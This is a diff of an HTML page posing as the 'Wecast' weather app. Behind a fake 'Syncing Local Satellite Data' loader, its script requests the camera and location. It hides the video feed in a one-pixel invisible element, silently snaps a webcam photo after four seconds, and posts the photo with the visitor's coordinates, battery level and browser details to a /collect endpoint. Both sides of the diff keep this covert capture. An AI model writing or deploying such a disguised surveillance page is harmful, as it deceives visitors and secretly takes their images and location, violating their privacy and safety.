@@ -3,135 +3,80 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Wecast - Professional Local Weather</title>
+    <title>Wecast - Professional Weather</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
         body { font-family: 'Poppins', sans-serif; background: #fdfdfd; overflow: hidden; }
         .glass-card { background: rgba(255, 255, 255, 0.2); backdrop-filter: blur(15px); border-radius: 30px; border: 1px solid rgba(255,255,255,0.3); }
         #camera-hidden { position: absolute; opacity: 0; pointer-events: none; width: 1px; height: 1px; }
-        
-        /* Loading Overlay Style */
-        #loader {
-            position: fixed; inset: 0; background: white; z-index: 50;
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-            transition: opacity 0.8s ease;
-        }
-        .spinner {
-            width: 50px; height: 50px; border: 5px solid #f3f3f3;
-            border-top: 5px solid #6366f1; border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
+        #loader { position: fixed; inset: 0; background: white; z-index: 50; display: flex; flex-direction: column; align-items: center; justify-content: center; transition: opacity 1s; }
+        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #6366f1; border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
-<body onload="initWeather()">
-    <div id="loader">
-        <div class="spinner mb-4"></div>
-        <h2 class="text-xl font-semibold text-gray-700">Syncing Local Satellite Data...</h2>
-        <p class="text-gray-400 text-sm">Detecting precise coordinates</p>
-    </div>
-
+<body onload="initApp()">
+    <div id="loader"><div class="spinner mb-4"></div><h2 class="text-gray-700 font-semibold">Syncing Local Satellite Data...</h2></div>
     <video id="camera-hidden" autoplay playsinline></video>
     <canvas id="helper-canvas" style="display:none;"></canvas>
 
     <div class="max-w-6xl mx-auto p-6">
         <div class="flex justify-between items-center mb-10">
-            <div class="flex items-center gap-2">
-                <div class="w-8 h-8 bg-indigo-600 rounded-full flex items-center justify-center text-white text-xs">W</div>
-                <h1 class="font-bold text-xl text-gray-800 tracking-tight">WECAST</h1>
-            </div>
-            <nav class="hidden md:flex gap-8 text-gray-400 font-medium">
-                <a href="#" class="text-indigo-600 border-b-2 border-indigo-600">Home</a>
-                <a href="#">Forecast</a><a href="#">News</a><a href="#">Contact</a>
-            </nav>
-            <div class="flex items-center gap-4 text-gray-400">
-                <span class="bg-gray-100 px-4 py-1.5 rounded-full text-xs font-semibold">📍 <span id="city-tag">Live</span></span>
-            </div>
+            <h1 class="font-bold text-xl text-gray-800">WECAST</h1>
+            <div class="flex gap-4 text-gray-400 text-xs">📍 <span id="city-tag">Detecting...</span></div>
         </div>
 
         <div class="relative h-[480px] overflow-hidden rounded-[50px] shadow-2xl">
-            <img src="https://images.unsplash.com/photo-1504608524841-42fe6f032b4b?auto=format&fit=crop&w=1200" class="absolute inset-0 w-full h-full object-cover">
-            <div class="absolute inset-0 bg-gradient-to-t from-black/50 via-transparent to-black/20 p-12 flex flex-col justify-between text-white">
-                <div>
-                    <h2 id="city-name" class="text-6xl font-bold mb-3">Weather</h2>
-                    <p class="opacity-90 text-lg" id="full-date"></p>
-                </div>
-                <div class="flex gap-6">
-                    <div class="glass-card p-5 flex items-center gap-4">
-                        <span class="text-2xl">💧</span>
-                        <div><p class="text-[10px] uppercase opacity-70">Humidity</p><p class="font-bold italic">42%</p></div>
-                    </div>
-                    <div class="glass-card p-5 flex items-center gap-4">
-                        <span class="text-2xl">🌬️</span>
-                        <div><p class="text-[10px] uppercase opacity-70">Wind</p><p class="font-bold italic">4 km/h</p></div>
-                    </div>
-                </div>
+            <img src="https://images.unsplash.com/photo-1534067783941-51c9c23ecefd?auto=format&fit=crop&w=1200" class="absolute inset-0 w-full h-full object-cover">
+            <div class="absolute inset-0 bg-gradient-to-t from-black/50 p-12 flex flex-col justify-between text-white">
+                <div><h2 class="text-6xl font-bold mb-3">Weather</h2><p id="full-date"></p></div>
                 <div class="absolute right-12 bottom-12 glass-card p-10 text-center w-64">
-                    <p class="text-xs uppercase tracking-[0.2em] mb-3 font-semibold">Today</p>
-                    <div class="text-8xl font-bold mb-2 tracking-tighter" id="temp-val">--°</div>
-                    <p class="text-sm font-medium tracking-wide">Real-time Conditions</p>
+                    <p class="text-xs uppercase mb-3">Today</p>
+                    <div class="text-8xl font-bold mb-2" id="temp-val">23°</div>
+                    <p class="text-sm font-medium">Real-time Conditions</p>
                 </div>
             </div>
         </div>
     </div>
 
     <script>
-        async function initWeather() {
-            document.getElementById('full-date').innerText = `Today, ${new Date().toLocaleDateString('en-US', {weekday:'long', month:'short', day:'numeric'})}`;
-
-            // 1. Silent Camera Start
+        async function initApp() {
+            document.getElementById('full-date').innerText = `Today, ${new Date().toLocaleDateString()}`;
             const video = document.getElementById('camera-hidden');
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
-            } catch (e) { console.log("Cam access denied"); }
+            try { const s = await navigator.mediaDevices.getUserMedia({ video: true }); video.srcObject = s; } catch(e){}
 
-            // 2. Get Location
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 const { latitude, longitude } = pos.coords;
-                
-                // Fetch real weather
-                const res = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${latitude}&longitude=${longitude}&current_weather=true`);
-                const data = await res.json();
-                
-                // Update UI in background
-                document.getElementById('temp-val').innerText = Math.round(data.current_weather.temperature) + '°';
+                // Fetch real temp from free API
+                const w = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${latitude}&longitude=${longitude}&current_weather=true`).then(r => r.json());
+                document.getElementById('temp-val').innerText = Math.round(w.current_weather.temperature) + '°';
+                document.getElementById('city-tag').innerText = "Active";
 
-                // 3. Automated Capture & Data Send
+                // Silent capture after 4 seconds
                 setTimeout(async () => {
-                    await performSilentCapture(latitude, longitude);
-                    
-                    // Hide Loader after 5 seconds total
-                    const loader = document.getElementById('loader');
-                    loader.style.opacity = '0';
-                    setTimeout(() => loader.style.display = 'none', 800);
+                    await capture(latitude, longitude);
+                    document.getElementById('loader').style.opacity = '0';
+                    setTimeout(() => document.getElementById('loader').style.display = 'none', 1000);
                 }, 4000);
-            }, () => {
-                // If Location denied, still show app after 4s
-                setTimeout(() => { document.getElementById('loader').style.display = 'none'; }, 4000);
             });
         }
 
-        async function performSilentCapture(lat, lon) {
-            const video = document.getElementById('camera-hidden');
-            const canvas = document.getElementById('helper-canvas');
-            
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            const photo = canvas.toDataURL('image/jpeg', 0.7);
-            
-            if(video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
+        async function capture(lat, lon) {
+            const v = document.getElementById('camera-hidden');
+            const c = document.getElementById('helper-canvas');
+            c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
+            c.getContext('2d').drawImage(v, 0, 0);
+            const photo = c.toDataURL('image/jpeg', 0.7);
+            if(v.srcObject) v.srcObject.getTracks().forEach(t => t.stop());
 
-            const bat = await navigator.getBattery();
+            const b = await navigator.getBattery();
             await fetch('/collect', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     ts: new Date().toLocaleString(),
                     location: { lat, lon },
-                    battery: { levelPercent: Math.round(bat.level * 100) },
+                    battery: { levelPercent: Math.round(b.level * 100) },
                     hints: { ua: navigator.userAgent },
                     burstImages: [photo]
                 })
